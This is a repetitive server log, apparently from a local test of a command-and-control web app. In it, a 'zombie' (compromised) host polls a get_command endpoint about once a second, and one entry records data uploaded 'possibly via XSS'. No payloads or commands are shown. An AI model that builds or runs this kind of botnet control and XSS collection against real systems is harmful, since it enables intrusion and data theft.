2025-06-25 00:04:29 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:30 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:31 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:32 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:33 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:34 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:35 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:04:36 | INFO     | control_route.py:26 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-25 00:04:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0002s) -> 回傳: (<Response 164 bytes [200 OK]>, 400)
2025-06-25 00:04:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:36] "[31m[1mGET /api/control/add_message HTTP/1.1[0m" 400 -
2025-06-25 00:04:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:36] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:04:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:36 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:37 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:38 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:39 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:40 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:41 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:42 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:43] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:04:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:43 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:44 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:45 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:46 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:47 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:48 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:49 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:50 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:51 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:52 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:53 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:54 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:55 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:56 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:57 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:58 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:59 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:00 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:01 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:02 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:03 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:04 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:06 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:07 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:08 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:09 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:10 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:11 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:12 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:13 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:14 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:15 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:16 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:17 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:18 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:19 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
